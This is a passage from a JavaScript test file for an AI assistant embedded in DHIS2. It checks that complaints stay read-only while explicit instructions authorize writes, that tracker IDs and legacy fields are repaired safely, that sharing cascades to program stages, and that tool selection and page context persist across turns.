      "I am not able to create enrollments",
      "it fails to save the event",
      "users are blocked from adding events",
      "it no longer lets me update the stage",
    ]) eq(`inability: "${t}"`, scope(t), 'read_only');

    // …and REAL instructions must still authorize (no over-correction).
    for (const t of [
      'add a data element to the stage',
      'please delete the TB program',
      'yes, go ahead and fix it',
      'make sure the stages have rwrw---- sharing',
      'update the sharing on the program',
      'create a tracker program for TB',
    ]) eq(`instruction: "${t}"`, scope(t), 'broad');

    // A complaint that ALSO carries an instruction still authorizes — the
    // surviving verb belongs to the instruction, not the inability clause.
    eq('complaint + explicit instruction still authorizes',
      scope("I can't add an enrollment — fix the sharing please"), 'broad');

    // Imperative "run the …" is an instruction; "doesn't run" is a complaint.
    eq('"run the analytics tables" authorizes', scope('run the analytics tables'), 'broad');
    eq('"regenerate the analytics" authorizes', scope('regenerate the analytics tables'), 'broad');
    eq('"the report doesn\'t run" does NOT authorize', scope("the report doesn't run"), 'read_only');
  }

  // ── Tracker ids the model invents are healed, not rejected ────────────────
  // "VPD-CASE-001" / "VPDCASE00001" are correlation labels, not identity. DHIS2
  // 400s the whole payload ("UID must be an alphanumeric string of 11
  // characters") and every event referencing the enrollment fails with it.
  console.log('\nTracker client-id healing:');
  const healIds = need('healTrackerClientIds');
  if (healIds) {
    const bundle = {
      trackedEntities: [{ trackedEntity: 'VPD-CASE-001', orgUnit: 'd3V3O1ooYoL' }],
      enrollments: [{ enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' }],
      events: [
        { event: 'EV-1', enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' },
        { event: 'EV-2', enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' },
      ],
    };
    const remap = healIds(bundle);
    eq('every invalid id is remapped exactly once', remap.size, 4);
    const te = bundle.trackedEntities[0].trackedEntity;
    const enr = bundle.enrollments[0].enrollment;
    truthy('the generated ids are valid DHIS2 UIDs',
      /^[A-Za-z][A-Za-z0-9]{10}$/.test(te) && /^[A-Za-z][A-Za-z0-9]{10}$/.test(enr));
    eq('the enrollment still points at the same tracked entity',
      bundle.enrollments[0].trackedEntity, te);
    eq('both events still point at the same enrollment',
      [bundle.events[0].enrollment, bundle.events[1].enrollment], [enr, enr]);
    truthy('the two events kept DISTINCT ids',
      bundle.events[0].event !== bundle.events[1].event);
    eq('orgUnit (not an id field) is untouched', bundle.trackedEntities[0].orgUnit, 'd3V3O1ooYoL');

    // Real server UIDs must never be rewritten — that would retarget the write.
    const existing = { events: [{ event: 'ogjDxinQdQh', enrollment: 'iYcoCK1ZUC8' }] };
    eq('valid UIDs are left alone', healIds(existing).size, 0);
    eq('…and the payload is unchanged', existing.events[0].event, 'ogjDxinQdQh');
  }

  // ── Org-unit assignment must not wipe OUs or clobber sharing ──────────────
  // "add all OUs to this program and make sure sharing lets me add data" ended
  // with the program assigned to ZERO org units (empty-array replace) and its
  // sharing reset to rw------ (the tool PUT a partial program body, and DHIS2
  // /metadata REPLACES). The program vanished from Capture. (live 2026-07-25)
  console.log('\nOrg-unit assignment safety:');
  {
    const gctFn2 = fn('getContextualTools');
    const mm2 = gctFn2
      ? gctFn2({ appType: 'Maintenance' }, 'add all OUs to this program', false)
          .find((t) => t.function.name === 'manage_metadata')
      : null;
    const props2 = mm2 && mm2.function.parameters && mm2.function.parameters.properties;
    truthy('manage_metadata exposes all_org_units', !!(props2 && props2.all_org_units));
    truthy('…and warns against passing an empty org_unit_ids',
      /empty org_unit_ids/i.test((props2 && props2.all_org_units && props2.all_org_units.description) || ''));
    truthy('manage_metadata exposes confirm_remove_all_org_units',
      !!(props2 && props2.confirm_remove_all_org_units));
    const buildManual2 = fn('buildToolManual');
    const manual2 = buildManual2 ? String(buildManual2('manage_metadata')) : '';
    truthy('the manual says the WHOLE program object is written back',
      /WHOLE program object/i.test(manual2));
    truthy('the manual warns an empty replace makes the program vanish',
      /vanish from Capture/i.test(manual2));
    truthy('the manual points at all_org_units for "add all OUs"',
      /all_org_units:\s*true/i.test(manual2));
  }

  // ── Legacy Tracker API field names are renamed, not dropped ───────────────
  // The pre-2.36 names (enrollmentDate/incidentDate/eventDate/…) are SILENTLY
  // IGNORED by the current API, so a payload written from old docs imports as
  // "Property enrolledAt is null" with every nested event failing too.
  console.log('\nLegacy tracker field renaming:');
  const legacy = need('normalizeTrackerLegacyFields');
  if (legacy) {
    const b = {
      enrollments: [{
        enrollmentDate: '2026-01-09', incidentDate: '2026-01-08',
        trackedEntityInstance: 'aaaaaaaaaa1',
        trackedEntityAttributes: [{ attribute: 'bbbbbbbbbb2', value: 'X' }],
        events: [{ programStage: 'cccccccccc3', eventDate: '2026-01-09', dueDate: '2026-02-01' }],
      }],
    };
    legacy(b, [], new Set());
    const e = b.enrollments[0];
    eq('enrollmentDate → enrolledAt', e.enrolledAt, '2026-01-09');
    eq('incidentDate → occurredAt', e.occurredAt, '2026-01-08');
    eq('trackedEntityInstance → trackedEntity', e.trackedEntity, 'aaaaaaaaaa1');
    truthy('trackedEntityAttributes → attributes', Array.isArray(e.attributes) && e.attributes.length === 1);
    eq('the old keys are removed', [e.enrollmentDate, e.incidentDate, e.trackedEntityInstance], [undefined, undefined, undefined]);
    eq('nested eventDate → occurredAt', e.events[0].occurredAt, '2026-01-09');
    eq('nested dueDate → scheduledAt', e.events[0].scheduledAt, '2026-02-01');
    // A new-style key already present must win.
    const keep = { enrollmentDate: '2020-01-01', enrolledAt: '2026-05-05' };
    legacy(keep, [], new Set());
    eq('an existing new-style value is never overwritten', keep.enrolledAt, '2026-05-05');
  }

  // ── Empty id strings are dropped, not sent ────────────────────────────────
  // "trackedEntity": "" makes DHIS2 try to deserialize "" into a UID and 400 the
  // WHOLE bundle. It means "assign one for me" — so remove the key.
  console.log('\nEmpty tracker id handling:');
  if (healIds) {
    const b2 = { enrollments: [{ trackedEntity: '', orgUnit: 'd3V3O1ooYoL', enrolledAt: '2026-01-09' }] };
    healIds(b2);
    eq('an empty trackedEntity key is removed entirely',
      Object.prototype.hasOwnProperty.call(b2.enrollments[0], 'trackedEntity'), false);
    eq('the rest of the object is untouched', b2.enrollments[0].orgUnit, 'd3V3O1ooYoL');
  }

  // ── Enrollment referencing a tracked entity nobody creates ────────────────
  // "Enrol 8 cases" written as a bare enrollments[] array whose trackedEntity
  // is a made-up label: DHIS2 answers E1068 and fails every nested event too.
  // A minted UID cannot exist server-side, so this is provable before sending.
  console.log('\nDangling tracked-entity reference:');
  const buildTW = need('buildTrackerWriteRequest');
  if (buildTW) {
    const dangling = buildTW('tracker', 'POST', {
      enrollments: [{ trackedEntity: 'TEI-VPD-001', program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
    }, {});
    truthy('an enrollment referencing an uncreated entity is refused',
      !!(dangling && dangling._error && dangling._scope === 'dangling_tracked_entity'));
    truthy('…and the fix shows the nested one-bundle shape',
      /trackedEntities/.test((dangling && dangling._hint) || '') && /nesting the enrollment/i.test((dangling && dangling._hint) || ''));
    truthy('…and it is non-disabling (a corrected retry must be allowed)',
      dangling && dangling._no_disable === true);

    // The correct nested shape must pass straight through.
    const nested = buildTW('tracker', 'POST', {
      trackedEntities: [{
        trackedEntityType: 'cccccccccc3', orgUnit: 'bbbbbbbbbb2',
        enrollments: [{ program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
      }],
    }, {});
    truthy('the nested trackedEntities shape is accepted', !!(nested && !nested._error && nested.bundle));

    // A REAL server UID is not minted, so it must not be flagged.
    const existing = buildTW('tracker', 'POST', {
      enrollments: [{ trackedEntity: 'ogjDxinQdQh', program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
    }, {});
    truthy('an existing tracked-entity UID is left alone', !!(existing && !existing._error));
  }

  // ── Nested events inherit their enrollment's person ───────────────────────
  // DHIS2 does not infer it: "Event <uid> of an Enrollment does not reference a
  // TrackedEntity" fails the whole atomic import (live 2026-07-25).
  console.log('\nNested event inheritance + de-duplication:');
  const normBundle = need('normalizeTrackerBundle');
  if (normBundle) {
    const r = normBundle({
      trackedEntities: [{
        trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', trackedEntityType: 'cccccccccc3',
        enrollments: [{ program: 'dddddddddd4', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09',
          events: [{ programStage: 'eeeeeeeeee5', occurredAt: '2026-01-10' }] }],
      }],
    }, ['trackedEntities'], {});
    const ev = r.bundle.trackedEntities[0].enrollments[0].events[0];
    eq('the nested event inherits trackedEntity', ev.trackedEntity, 'aaaaaaaaaa1');
    eq('…and the enrollment orgUnit when it had none', ev.orgUnit, 'bbbbbbbbbb2');
    eq('the enrollment inherits the entity too',
      r.bundle.trackedEntities[0].enrollments[0].trackedEntity, 'aaaaaaaaaa1');
    truthy('the substitution is reported', r.conversionNotes.some(n => /nested event/i.test(n)));

    // An explicit value must never be overwritten.
    const keep = normBundle({
      enrollments: [{ trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09',
        events: [{ programStage: 'eeeeeeeeee5', trackedEntity: 'ffffffffff6', occurredAt: '2026-01-10' }] }],
    }, ['enrollments'], {});
    eq('an explicit event trackedEntity is preserved',
      keep.bundle.enrollments[0].events[0].trackedEntity, 'ffffffffff6');

    // The same id twice in one bundle → "already exists" kills the import.
    const dup = normBundle({
      trackedEntities: [
        { trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' },
        { trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' },
        { trackedEntity: 'gggggggggg7', orgUnit: 'bbbbbbbbbb2' },
      ],
    }, ['trackedEntities'], {});
    eq('a repeated id is dropped', dup.bundle.trackedEntities.length, 2);
    truthy('…and the de-duplication is reported',
      dup.conversionNotes.some(n => /duplicate/i.test(n)));
    // Entries without an id are all distinct new records — never collapsed.
    const noIds = normBundle({
      trackedEntities: [{ orgUnit: 'bbbbbbbbbb2' }, { orgUnit: 'bbbbbbbbbb2' }],
    }, ['trackedEntities'], {});
    eq('id-less entries are all kept', noIds.bundle.trackedEntities.length, 2);
  }

  // ── The tracker heals must not change UPDATE / DELETE behaviour ───────────
  // Minting a UID is only safe when CREATING. On an update or delete the id
  // names an EXISTING record, so substituting a fresh UID would retarget the
  // write at another object instead of surfacing the bad id.
  console.log('\nTracker heals are create-only (no update/delete regression):');
  if (buildTW) {
    const badId = { events: [{ event: 'NOT-A-UID', programStage: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' }] };
    const upd = buildTW('tracker/events', 'PUT', JSON.parse(JSON.stringify(badId)), {});
    eq('an UPDATE keeps the caller\'s (bad) id untouched',
      upd && upd.bundle && upd.bundle.events[0].event, 'NOT-A-UID');
    eq('…and still routes as an UPDATE', upd && upd.importStrategy, 'UPDATE');
    const del = buildTW('tracker/events', 'DELETE', JSON.parse(JSON.stringify(badId)), {});
    eq('a DELETE keeps the caller\'s id untouched',
      del && del.bundle && del.bundle.events[0].event, 'NOT-A-UID');
    eq('…and still routes as a DELETE', del && del.importStrategy, 'DELETE');
    // A CREATE still heals, as designed.
    const cre = buildTW('tracker/events', 'POST', JSON.parse(JSON.stringify(badId)), {});
    truthy('a CREATE still mints a real UID',
      /^[A-Za-z][A-Za-z0-9]{10}$/.test(cre && cre.bundle && cre.bundle.events[0].event));
    // A well-formed UPDATE of a real record must be completely unchanged.
    const realUpd = buildTW('tracker/events', 'PUT', {
      events: [{ event: 'ogjDxinQdQh', programStage: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', occurredAt: '2026-01-01' }],
    }, {});
    eq('a valid UPDATE payload passes through verbatim',
      realUpd && realUpd.bundle && realUpd.bundle.events[0].event, 'ogjDxinQdQh');
  }

  // ── Enrollment incident date is defaulted, not dropped ────────────────────
  // displayIncidentDate=true (the DHIS2 default) makes occurredAt mandatory on
  // the enrollment; omitting it fails the enrollment AND every event nested
  // under it ("DisplayIncidentDate is true but occurredAt is null").
  console.log('\nEnrollment incident-date defaulting:');
  const normEnr = need('normalizeTrackerEnrollmentObject');
  if (normEnr) {
    const notes = [];
    const out = normEnr({ enrolledAt: '2026-03-01', trackedEntity: 'aaaaaaaaaa1' }, {}, notes, {});
    eq('occurredAt defaults to enrolledAt', out.occurredAt, '2026-03-01');
    truthy('…and the substitution is reported', notes.some((n) => /occurredAt/.test(n)));
    const explicit = normEnr({ enrolledAt: '2026-03-01', occurredAt: '2026-02-14' }, {}, [], {});
    eq('an explicit occurredAt is never overwritten', explicit.occurredAt, '2026-02-14');
    const legacy = normEnr({ enrolledAt: '2026-03-01', incidentDate: '2026-01-05' }, {}, [], {});
    eq('the legacy incidentDate field is respected', legacy.occurredAt, undefined);
    const noDate = normEnr({ trackedEntity: 'aaaaaaaaaa1' }, {}, [], {});
    eq('nothing is invented when there is no enrolledAt', noDate.occurredAt, undefined);
  }

  // ── Sharing a program implies sharing its stages ───────────────────────────
  // Stage DATA bits gate event capture, so a program shared rwrw---- whose
  // stages are still rw------ blocks enrollment while looking correct.
  console.log('\nSharing cascade (program → stages):');
  {
    // TOOLS is a bundle-lexical const, so reach the definition through the
    // selector (which returns the real tool objects).
    const gctFn = fn('getContextualTools');
    const mm = gctFn
      ? gctFn({ appType: 'Maintenance' }, 'update the sharing on this program', false)
          .find((t) => t.function.name === 'manage_metadata')
      : null;
    const props = mm && mm.function.parameters && mm.function.parameters.properties;
    truthy('manage_metadata exposes cascade_to_stages', !!(props && props.cascade_to_stages));
    truthy('…and it documents the default-true behaviour',
      /default\s+true/i.test((props && props.cascade_to_stages && props.cascade_to_stages.description) || ''));
    const buildManual = fn('buildToolManual');
    const manual = buildManual ? buildManual('manage_metadata') : '';
    truthy('the manual teaches that stages are shared with the program',
      /stages are shared WITH it/i.test(String(manual)));
    truthy('the manual warns that DE/TEA/optionSet are not data-shareable',
      /dataShareable:false/i.test(String(manual)));
    truthy('…and tells the model a dropped data bit is DONE, not a failure',
      /_data_sharing_not_applicable/.test(String(manual)) && /do NOT repeat it across sibling/i.test(String(manual)));
  }

  // ── Option-literal rewrite covers A{} attribute variables ──────────────────
  // A TEA-sourced program-rule variable is referenced as A{name}. The rewrite
  // scanned only #{name}, so an option comparison on an ATTRIBUTE kept its
  // display-name literal, saved clean, and NEVER FIRED (live 2026-07-25:
  // A{clinical_diagnosis} == 'Neonatal Tetanus' should be 'NEONATAL_TETANUS').
  console.log('\nOption-literal rewrite (A{} attribute variables):');
  const rewriteOpts = need('rewriteOptionLiteralsGeneric');
  if (rewriteOpts) {
    const OS = 'os1';
    const optionsByOsKey = new Map([[OS, [
      { name: 'Neonatal Tetanus', code: 'NEONATAL_TETANUS' },
      { name: 'Measles', code: 'MEASLES' },
    ]]]);
    const run = (condition) => {
      const rules = [{ name: 'R', condition }];
      const out = rewriteOpts({
        rules, actions: [],
        varToOsKey: new Map([['clinical_diagnosis', OS]]),
        targetToOsKey: new Map(), optionsByOsKey,
      });
      return { condition: rules[0].condition, ...out };
    };
    eq('A{} display-name literal is rewritten to the option CODE',
      run("A{clinical_diagnosis} == 'Neonatal Tetanus'").condition,
      "A{clinical_diagnosis} == 'NEONATAL_TETANUS'");
    eq('the A{} sigil is preserved (never turned into #{})',
      run("A{clinical_diagnosis} != 'Measles'").condition,
      "A{clinical_diagnosis} != 'MEASLES'");
    eq('reversed operand order works too',
      run("'Measles' == A{clinical_diagnosis}").condition,
      "'MEASLES' == A{clinical_diagnosis}");
    eq('#{} still works (no regression)',
      run("#{clinical_diagnosis} == 'Measles'").condition,
      "#{clinical_diagnosis} == 'MEASLES'");
    eq('a literal that is already a code is left alone',
      run("A{clinical_diagnosis} == 'MEASLES'").condition,
      "A{clinical_diagnosis} == 'MEASLES'");
    eq('an empty-value check is left alone',
      run("A{clinical_diagnosis} != ''").condition,
      "A{clinical_diagnosis} != ''");
    const dead = run("A{clinical_diagnosis} == 'Polio'");
    eq('an A{} literal matching no option is reported dead', dead.deadLiterals.length, 1);
    truthy('…and the advisory names the A{} token',
      /A\{clinical_diagnosis\}/.test(dead.advisories[0] || ''));
  }

  // ── Line-list dimension near-name matching ─────────────────────────────────
  // create_program appends a qualifier when a name collides with an unrelated
  // existing object ("Final case classification" → "Final case classification
  // (VPD CBS)"), so the name the user asks for no longer matches displayName
  // exactly and the column was refused (live 2026-07-25). Resolve it when
  // exactly one candidate matches; never guess between several.
  console.log('\nLine-list dimension near-name matching:');
  const normDim = need('lineListNormalizeDimName');
  const nearDim = need('lineListNearestDimensions');
  if (normDim && nearDim) {
    eq('a rename qualifier is stripped',
      normDim('Final case classification (VPD CBS)'), 'final case classification');
    eq('a bracketed qualifier is stripped too',
      normDim('IgM result [lab]'), 'igm result');
    eq('punctuation/case are normalized',
      normDim('Date of onset  of rash/fever'), 'date of onset of rash fever');
    eq('a mid-name parenthetical is NOT stripped (only trailing)',
      normDim('Cases (%) investigated'), 'cases investigated');

    const mkCtx = (des) => ({
      teas: new Map(), pis: new Map(),
      des: new Map(des.map((d) => [d.id, d])),
    });
    const ctxOne = mkCtx([
      { id: 'aaaaaaaaaa1', name: 'Final case classification (VPD CBS)' },
      { id: 'aaaaaaaaaa2', name: 'Vaccination status' },
    ]);
    const one = nearDim('Final case classification', ctxOne);
    eq('a renamed DE resolves to exactly one candidate', one.length, 1);
    eq('…and it is the renamed one', one[0] && one[0].id, 'aaaaaaaaaa1');
    eq('an unrelated name still matches nothing',
      nearDim('Haemoglobin level', ctxOne).length, 0);

    const ctxTwo = mkCtx([
      { id: 'bbbbbbbbbb1', name: 'Specimen date (lab)' },
      { id: 'bbbbbbbbbb2', name: 'Specimen date (field)' },
    ]);
    eq('an ambiguous near-match returns BOTH (caller must ask)',
      nearDim('Specimen date', ctxTwo).length, 2);

    // A short token must never sweep in every field via prefix matching.
    const ctxShort = mkCtx([
      { id: 'cccccccccc1', name: 'Date of birth' },
      { id: 'cccccccccc2', name: 'Date of onset' },
    ]);
    eq('a short token does NOT prefix-match everything', nearDim('Date', ctxShort).length, 0);
  }

  // ── Sticky tools across a conversation ─────────────────────────────────────
  // The keyword router matches the CURRENT message only, so a follow-up turn
  // ("now remove it and put it back to how it was") de-selected the tool that
  // did the work last turn. With grammar-constrained tool decoding the model
  // then cannot name it at all — the decoder snaps to the nearest tool that IS
  // on the wire (live 2026-07-25: manage_custom_translations → manage_custom_forms,
  // which then looped until the circuit breaker fired). A tool used earlier in
  // the conversation must stay available.
  console.log('\nSticky tool availability (follow-up turns):');
  const gct = need('getContextualTools');
  const noteUsed = need('noteToolUsedThisThread');
  const threadTools = need('getThreadToolNames');
  if (gct && noteUsed && threadTools) {
    const names = (t, txt) => new Set(gct(t, txt, false).map((x) => x.function.name));
    const FOLLOW_UP = 'now, remove it and put it back to how it was';
    const MAINT = { appType: 'Maintenance' };

    // Baseline: the follow-up wording alone must NOT select the tool.
    truthy('follow-up wording alone does not select manage_custom_translations',
      !names(MAINT, FOLLOW_UP).has('manage_custom_translations'));

    // First turn names the feature → selected, and recorded as used.
    truthy('explicit wording selects manage_custom_translations',
      names(MAINT, 'use the custom translation feature and translate this page into arabic')
        .has('manage_custom_translations'));
    noteUsed('manage_custom_translations');
    truthy('a used tool is remembered for the thread',
      threadTools().has('manage_custom_translations'));

    // The bug, fixed: the follow-up turn keeps it.
    truthy('follow-up turn KEEPS the tool used earlier in the conversation',
      names(MAINT, FOLLOW_UP).has('manage_custom_translations'));

    // Generalises to any tool, on any page.
    noteUsed('manage_line_lists');
    truthy('stickiness is tool-agnostic (manage_line_lists on a follow-up)',
      names({ appType: 'Dashboard' }, 'undo that change please').has('manage_line_lists'));

    // Unused tools are still filtered out — this is a union, not "send everything".
    truthy('an unused, irrelevant tool is still not selected',
      !names(MAINT, FOLLOW_UP).has('manage_growth_chart_plugin'));

    // Safety boundary intact: a save-failure diagnosis with no write
    // authorization must STILL strip destructive tools, sticky or not.
    const D2 = need('classifyWriteAuthorization');
    if (D2) {
      D2('I am getting an error saving the enrollment'); // sets writeAuth = read_only
      truthy('save-diagnosis mode still strips a sticky destructive tool',
        !names(MAINT, 'I am getting an error saving the enrollment').has('manage_custom_translations'));
      truthy('isSaveDiagnosisReadOnly agrees',
        need('isSaveDiagnosisReadOnly')('I am getting an error saving the enrollment') === true);
      // …and an authorized fix turn gets it back.
      D2('yes, fix it');
      truthy('an authorized turn restores the sticky tool',
        names(MAINT, 'yes, fix it').has('manage_custom_translations'));
    }
  }

  // ── Growth-chart measurement detection ────────────────────────────────────
  // Regression for the 2026-07-25 report. A real examination stage lists the
  // TEXT classification fields BEFORE the numeric measurements, so first-match
  // -wins name detection wrote "Height status" as the height data element. The
  // plugin's own validator only checks that a UID belongs to the stage, so the
  // config was accepted and the chart silently plotted nothing.
  console.log('\nGrowth-chart measurement detection:');
  const pick = fn('gcPickMeasurement');
  if (!pick) bad('gcPickMeasurement — missing');
  else {
    const stage = [
      { id: 'stageDe0001', displayName: 'Hemoglobin', valueType: 'NUMBER' },
      { id: 'stageDe0002', displayName: 'Height status', valueType: 'TEXT' },
      { id: 'stageDe0003', displayName: 'Weight Status', valueType: 'TEXT' },
      { id: 'stageDe0004', displayName: 'Acute Malnutrition', valueType: 'TEXT' },
      { id: 'stageDe0005', displayName: 'Height (cm)', valueType: 'NUMBER' },
      { id: 'stageDe0006', displayName: 'Weight (Kg)', valueType: 'NUMBER' },
      { id: 'stageDe0007', displayName: 'BMI', valueType: 'NUMBER' },
      { id: 'stageDe0008', displayName: 'Head Circumference (cm)', valueType: 'NUMBER' },
    ];
    eq('height skips the TEXT "Height status"', pick(stage, 'height')?.id, 'stageDe0005');
    eq('weight skips the TEXT "Weight Status"', pick(stage, 'weight')?.id, 'stageDe0006');
    eq('head circumference resolves', pick(stage, 'headCircumference')?.id, 'stageDe0008');

    // Derived fields never stand in for the raw measurement.
    const derived = [
      { id: 'aaaaaaaaaa1', displayName: 'Weight-for-age z-score', valueType: 'NUMBER' },
      { id: 'aaaaaaaaaa2', displayName: 'Birth weight (Kg)', valueType: 'NUMBER' },
      { id: 'aaaaaaaaaa3', displayName: 'Weight gain', valueType: 'NUMBER' },
    ];
    eq('z-score / birth weight / weight gain are not the weight', pick(derived, 'weight'), null);

    // A unit-carrying name wins over a bare one, whatever the stage order.
    const bare = [
      { id: 'bbbbbbbbbb1', displayName: 'Weight', valueType: 'NUMBER' },
      { id: 'bbbbbbbbbb2', displayName: 'Weight (kg)', valueType: 'NUMBER' },
    ];
    eq('a unit-carrying name outranks a bare one', pick(bare, 'weight')?.id, 'bbbbbbbbbb2');

    // MUAC is a circumference but never a head circumference.
    const muac = [{ id: 'cccccccccc1', displayName: 'MUAC circumference (cm)', valueType: 'NUMBER' }];
    eq('MUAC is not head circumference', pick(muac, 'headCircumference'), null);
    eq('a non-numeric measurement is never chosen',
      pick([{ id: 'dddddddddd1', displayName: 'Weight (Kg)', valueType: 'TEXT' }], 'weight'), null);
  }

  // ── Unfinished-turn guard: announcement-only replies (2026-07-26) ─────────
  // A turn that ends on "Creating the program shell …, then adding the
  // remaining stages." with no tool call silently abandons the task — the
  // panel goes idle with no error (the W4W Clinic stall). The loop nudges the
  // model to continue when this fires mid-task.
  console.log('\nUnfinished-turn announcement detection:');
  const ann = need('looksLikeUnfinishedAnnouncement');
  if (ann) {
    eq('the live W4W announcement is detected',
      ann('Creating the program shell with registration attributes and Form 1 first, then adding the remaining stages.'), true);
    eq('a first-person promise is detected',
      ann("I'll now create the remaining stages and program rules."), true);
    eq('a past-tense completion summary is NOT flagged',
      ann('Done. Created the W4W Clinic program with 8 stages, 30 rules and 12 attributes.'), false);
    eq('a question to the user is NOT flagged',
      ann('Two programs match "W4W". Which one should I extend?'), false);
    eq('a long final report is NOT flagged', ann('Creating summary: ' + 'x'.repeat(2100)), false);
    eq('empty text is NOT flagged', ann(''), false);
    // Haiku, Child Vaccination app (2026-11-25): the promise sat mid-reply, before the link.
    eq('a mid-reply "Next I\'ll run the data checks" is detected',
      ann('The app is installed as **Child Vaccination Follow-up** (version 1.0.0). Its install check passed, but no real records were loaded, so the counts below are not yet verified. Next I\'ll run the data checks on the live program before reporting any figures.\n\nBackup and sharing: nothing was shared or changed beyond the app itself.\n\nOpen the app from the DHIS2 app menu, or at https://play.im.dhis2.org/stable-2-43-2-1/apps/ai-child-vaccination-followup.'), true);
    eq('"I\'ll run …" in the tail is detected', ann('Saved the dashboard. I\'ll run the analytics check now.'), true);
    eq('an offer to the user ("next I can … if you want") is NOT flagged',
      ann('Built the dashboard with 12 tiles: https://x/#/abc. If you want, next I\'ll add a map of facilities.'), false);
    eq('a "Next steps for you" list is NOT flagged',
      ann('Built and installed the app.\n\nNext steps for you:\n- Open it from the app menu.\n- Click a facility to filter the list.'), false);
  }

  // ── Rule-action target resolution (the "Allergy Details" 409) ─────────────
  // HIDEFIELD targeting "Allergy Details" while the DE was created as
  // "Allergy details" shipped a targetless action and 409'd the whole batch
  // at VALIDATE (live 2026-07-26). Loose resolution forgives case/spacing;
  // the missing-target lint refuses anything still unresolved client-side.
  console.log('\nRule-action target resolution:');
  const loose = need('resolveLooseNameKey');
  if (loose) {
    const keys = ['Allergy', 'Allergy details', 'Chronic Disease Type'];
    eq('exact key wins', loose('Allergy', keys), 'Allergy');
    eq('case drift resolves to the canonical key', loose('Allergy Details', keys), 'Allergy details');
    eq('whitespace drift resolves', loose('  chronic disease   type ', keys), 'Chronic Disease Type');
    eq('an ambiguous prefix is NOT guessed', loose('Aller', keys), null);
    eq('an unknown name returns null', loose('Blood Group', keys), null);
  }
  // ── Sticky page context (the "can't see what stage I'm in" wipe) ──────────
  // Every hashchange/tab switch/chat turn rebuilds pageContext from the raw
  // URL; Capture's enrollment dashboard has no stageId and its event-edit
  // route has no programId, so a plain re-parse silently erased the detected
  // stage (and program) the model needed for "this stage" (live 2026-07-28).
  console.log('\nSticky page context:');
  const carry = need('carryStickyContext');
  if (carry) {
    eq('dashboard URL keeps detected stage within same program',
      carry({ programId: 'P1' }, { programId: 'P1', stageId: 'S1' }).stageId, 'S1');
    eq('different program drops the stage',
      carry({ programId: 'P2' }, { programId: 'P1', stageId: 'S1' }).stageId, undefined);
    eq('event-edit URL (eventId only) keeps resolved program',
      carry({ eventId: 'E1' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).programId, 'P1');
    eq('same event keeps its stage',
      carry({ eventId: 'E1' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).stageId, 'S1');
    eq('a DIFFERENT event voids the stage carry',
      carry({ eventId: 'E2' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).stageId, undefined);
    eq('a stage in the fresh URL always wins',
      carry({ programId: 'P1', stageId: 'S9' }, { programId: 'P1', stageId: 'S1' }).stageId, 'S9');
    eq('leaving the program flow entirely carries nothing',
      carry({ appType: 'Dashboard' }, { programId: 'P1', stageId: 'S1' }).stageId, undefined);
  }

  // Endpoint path segments that look like UIDs must stay exempt from the
  // unknown-UID refusal (maintenance/dataPruning was refused live 2026-07-28).
  const extractUids = need('extractUidsFromCallArgs');
  if (extractUids) {
    eq('maintenance/dataPruning path yields no UID candidates',
      extractUids('dhis2_query', { path: 'maintenance/dataPruning' }), []);
    eq('a real UID in a path is still extracted',
      extractUids('dhis2_query', { path: 'programs/a3kGcGpz8FJ' }), ['a3kGcGpz8FJ']);
  }

  // ── Detected context must be PERSISTED, not just held in memory ──────────
  // Chrome kills the MV3 worker after ~30 s idle and rebuilds `dhis2` from
  // chrome.storage.session. carryStickyContext computes the right sticky
  // context, but three sites wrote it to memory only — so the stage was known
  // "for a bit" and then permanently gone (reported live 2026-08-06). The
  // sticky carry cannot be re-derived from the URL, so every site that assigns
  // pageContext outside initializeFromUrl MUST call saveState().
  console.log('\nPage-context persistence:');
  {
    const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
    const blockAfter = (marker, len) => {
      const i = agentSrc.indexOf(marker);
      return i === -1 ? null : agentSrc.slice(i, i + len);
    };
    const cases = [
      ['function applyDetectedStage', 2000, 'detected stage is persisted'],
      ['async function syncFromTab', 1200, 'tab-switch context carry is persisted'],
    ];
    for (const [marker, len, label] of cases) {
      const blk = blockAfter(marker, len);
      if (!blk) { bad(`${label} — could not locate ${marker} in src/agent.js`); continue; }
      if (!/\bsaveState\s*\(/.test(blk)) bad(`${label} — no saveState() call; a worker restart will lose it`);
      else ok(label);
    }
    // The chat-turn rebuild must persist on EVERY branch, including the
    // "nothing else changed" one.
    const chatBlk = blockAfter('const freshCtx = carryStickyContext', 2600);
    if (!chatBlk) bad('chat-turn context rebuild — could not locate it in src/agent.js');
    else if ((chatBlk.match(/\bsaveState\s*\(/g) || []).length < 3) {
      bad('chat-turn context rebuild — a branch assigns pageContext without saveState()');
    } else ok('chat-turn context rebuild is persisted on every branch');
  }

  // ── Multi-UID path heal (the DHIS2 405 that looks like a working URL) ────
  // GET /api/optionSets/A,B,C is what models reach for and DHIS2 answers 405.
  console.log('\nMulti-UID path heal:');
  const heal = need('healMultiUidPath');
  if (heal) {
    const healed = heal('optionSets/qP6eFxS2QfQ,G26Oi8VjeXV,sSgEHRhCkjR?fields=id,displayName', 'GET');
    truthy('three UIDs become a collection query', healed.startsWith('optionSets?'));
    truthy('ids land in filter=id:in:[…]', decodeURIComponent(healed).includes('filter=id:in:[qP6eFxS2QfQ,G26Oi8VjeXV,sSgEHRhCkjR]'));
    truthy('fields are preserved', decodeURIComponent(healed).includes('fields=id,displayName'));
    truthy('paging is disabled so all ids come back', healed.includes('paging=false'));
